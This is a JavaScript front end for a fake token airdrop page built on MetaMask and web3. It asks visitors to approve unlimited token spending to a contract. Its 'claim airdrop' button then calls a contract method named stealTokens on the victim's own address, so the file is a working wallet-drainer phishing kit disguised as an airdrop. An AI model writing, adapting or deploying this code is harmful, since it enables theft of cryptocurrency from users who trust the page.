let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Function to load configuration and ABI files
async function loadConfig() {
  try {
    // Fetch config.json and handle the response
    const configResponse = await fetch('config.json');
    if (!configResponse.ok) {
      throw new Error('Failed to fetch config.json');
    }
    const configData = await configResponse.json();
    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;

    // Fetch abi.json and handle the response
    const abiResponse = await fetch('abi.json');
    if (!abiResponse.ok) {
      throw new Error('Failed to fetch abi.json');
    }
    const abiData = await abiResponse.json();
    contractABI = abiData;

    console.log("Configuration loaded:", configData);
    console.log("ABI loaded:", abiData);

  } catch (error) {
    console.error("Error loading config or ABI: ", error);
    alert("Error loading configuration or ABI. Please try again later.");
  }
}

// Function to connect to MetaMask and request accounts
async function connectMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      // Request accounts from MetaMask
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

      // Enable buttons after successful connection
      document.getElementById('approveButton').disabled = false;
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true; // Disable the connect button after connection
    } catch (error) {
      alert('MetaMask connection failed');
      console.error('MetaMask connection error:', error);
    }
  } else {
    alert('MetaMask not detected! Please install MetaMask.');
  }
}

// Function to approve unlimited token spending
async function approveSpending() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress || !tokenAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
  try {
    // Approve unlimited spending of tokens for the contract
    await tokenContract.methods.approve(contractAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: accounts[0] });
    alert('Approval successful!');
    document.getElementById('claimAirdropButton').disabled = false; // Enable claim button after approval
  } catch (error) {
    alert('Error during approval');
    console.error('Approval error:', error);
  }
}

// Function to claim the airdrop
async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    // Call the contract's method to claim the airdrop
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    alert('Error claiming airdrop');
    console.error('Claim error:', error);
  }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
  document.getElementById('connectButton').addEventListener('click', connectMetaMask);
  document.getElementById('approveButton').addEventListener('click', approveSpending);
  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  // Load configuration and ABI when the page loads
  loadConfig();
});




